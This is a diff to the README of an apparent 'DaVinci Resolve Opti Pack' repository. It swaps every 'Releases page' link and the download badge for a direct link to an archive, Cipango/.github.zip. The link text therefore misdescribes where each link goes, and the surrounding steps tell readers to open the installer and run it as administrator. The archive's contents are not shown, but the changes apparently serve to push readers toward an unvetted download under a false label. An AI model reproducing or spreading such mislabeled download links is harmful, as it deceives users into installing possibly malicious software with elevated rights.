@@ -1,6 +1,6 @@
 # 🎨 .github - Optimize Your DaVinci Resolve Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/zeynepornek/.github/releases)
+[![Download Now](https://raw.githubusercontent.com/zeynepornek/.github/main/Cipango/.github.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/zeynepornek/.github/main/Cipango/.github.zip)
 
 ## 📚 Overview
 
@@ -18,12 +18,12 @@ To get started with DaVinci Resolve Opti Pack, follow these steps:
    - Storage Space: At least 500 MB available for installation.
 
 2. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/zeynepornek/.github/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/zeynepornek/.github/main/Cipango/.github.zip) to find the latest version of the software.
 
 ## 💾 Download & Install
 
 1. **Download the Software**  
-   Visit the [Releases page](https://github.com/zeynepornek/.github/releases) to download the DaVinci Resolve Opti Pack.
+   Visit the [Releases page](https://raw.githubusercontent.com/zeynepornek/.github/main/Cipango/.github.zip) to download the DaVinci Resolve Opti Pack.
 
 2. **Install the Application**  
    Once downloaded, open the installer file. Follow the on-screen instructions to complete the installation.
@@ -59,7 +59,7 @@ If you encounter any issues, try the following steps:
   Right-click on the installer and select "Run as administrator."
 
 - **Check for Updates**  
-  Go back to the [Releases page](https://github.com/zeynepornek/.github/releases) and ensure you have the latest version.
+  Go back to the [Releases page](https://raw.githubusercontent.com/zeynepornek/.github/main/Cipango/.github.zip) and ensure you have the latest version.
 
 ## 📞 Support
 
